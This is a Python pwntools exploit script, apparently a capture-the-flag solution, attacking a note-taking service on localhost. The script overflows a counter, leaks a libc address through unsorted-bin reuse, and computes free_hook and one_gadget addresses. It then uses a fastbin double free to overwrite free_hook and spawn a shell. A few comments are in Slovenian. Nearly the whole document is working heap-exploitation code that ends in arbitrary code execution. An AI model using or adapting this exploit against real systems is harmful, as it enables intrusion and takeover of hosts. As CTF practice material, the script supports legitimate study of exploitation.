#!/usr/bin/env python3

from pwn import context, ELF, gdb, p64, u64, process, remote, log

#context.terminal = ["tmux", "splitw", "-h"]

#bin = ELF("./app")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# offsets in eton
# 339 = malloc
# 933 = leave

gdbscript = """
b * eton + 933
"""

#p = gdb.debug("./app", gdbscript)
#p = process("./app")
#dbg = gdb.attach(p, gdbscript="""
#b * eton + 455
#b * eton + 953
#""")
p = remote("localhost", 1337)

def malloc(idx, size, data):
    p.sendline(b"note add " + idx + b" " + size + b" " + data)
    p.recvuntil(b"Note created")

def free(idx):
    p.sendline(b"note remove " + idx)

def print_chunk(idx):
    p.sendline(b"note show " + idx)

# overflow the offset counter
payload_1 = b"touch "
payload_1 += 128 * b"A"
p.sendline(payload_1)

# heap stuff
# tcachebins
malloc(b"0", b"500", b"A")
malloc(b"1", b"500", b"A")
malloc(b"2", b"500", b"A")
malloc(b"3", b"500", b"A")
malloc(b"4", b"500", b"A")
malloc(b"5", b"500", b"A")
malloc(b"6", b"500", b"A")

# will go to unsorted bins
malloc(b"7", b"500", b"B")
# anti-consolidation prot
malloc(b"8", b"10", b"C")

free(b"0")
free(b"1")
free(b"2")
free(b"3")
free(b"4")
free(b"5")
free(b"6")

# goes to unsorted
free(b"7")

# malloc back from tcache
# these will go to tcache when free'd
for _ in range(7):
    malloc(b"0", b"500", b"D")

# we have to alloc smaller chunk than before in order for it to be malloced as we want it to
# otherwise it's content will be "null-ed out"
malloc(b"7", b"20", 8 * b"A")

# print leak
print_chunk(b"7")

p.recvuntil(b"AAAAAAAA")
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Leak: {hex(leak)}")
# ^ this leak is from main_arena + 592

# calc libc base           
# vmmap yields libc base at runtime: 0x7efdcc865000
# base is diff between leak and above value
main_arena_offset = 0x3ebe90
libc_base = leak - main_arena_offset
log.info(f"libc base: {hex(libc_base)}")

# free hook
__free_hook_offset = 0x03ed8e8
__free_hook = libc_base + __free_hook_offset
log.info(f"__free_hook: {hex(__free_hook)}")

# system
system_offset = 0x04f420                                 
system = libc_base + system_offset
log.info(f"system: {hex(system)}")

# one_gadgets
one_gadget_1 = libc_base + 0x4f2a5
one_gadget_2 = libc_base + 0x4f302
one_gadget_3 = libc_base + 0x10a2fc

# let's do a double free

# for tcache
malloc(b"0", b"20", b"C")
malloc(b"1", b"20", b"C")
malloc(b"2", b"20", b"C")
malloc(b"3", b"20", b"C")
malloc(b"4", b"20", b"C")
malloc(b"5", b"20", b"C")
malloc(b"6", b"20", b"C")

# for fastbins
malloc(b"7", b"20", b"C")
malloc(b"8", b"20", b"C")

# fill tcache
free(b"0")
free(b"1")
free(b"2")
free(b"3")
free(b"4")
free(b"5")
free(b"6")

# fill fastbins
free(b"7")
free(b"8")
free(b"7")

# empty tcache
for _ in range(7):
    malloc(b"0", b"20", b"/bin/sh")         # /bin/sh string here for ovrride with system method, no need for it when going with one gadgets

# empty and poison fastbins
malloc(b"1", b"20", p64(__free_hook))           # setup fake pointer in the bins
malloc(b"1", b"20", b"h")
malloc(b"1", b"20", b"h")
#malloc(b"1", b"20", p64(system))                # content of fake chunk at __free_hook
malloc(b"1", b"20", p64(one_gadget_2))

# SEGFAULT ker je zadnji bajt system addressa 0x20 (presledek). Ko je payload poslan, so bajti naslova v obratnem vrstnem redu (p64)
# Torej ko tokenizer shella vidi 0x20 na vhodu, rece "oh, presledek, tebe bomo zamenjali z nullbytom in te bomo skippali :)

# ~~call free so that __free_hook triggers aka shell spawns~~
free(b"0")

p.interactive()


# one gadgets:
# 0x4f2a5       rsp & 0xf = 0, rcx = null
# 0x4f302       rsp + 0x40 = null
# 0x10a2fc      rsp + 0x70 = null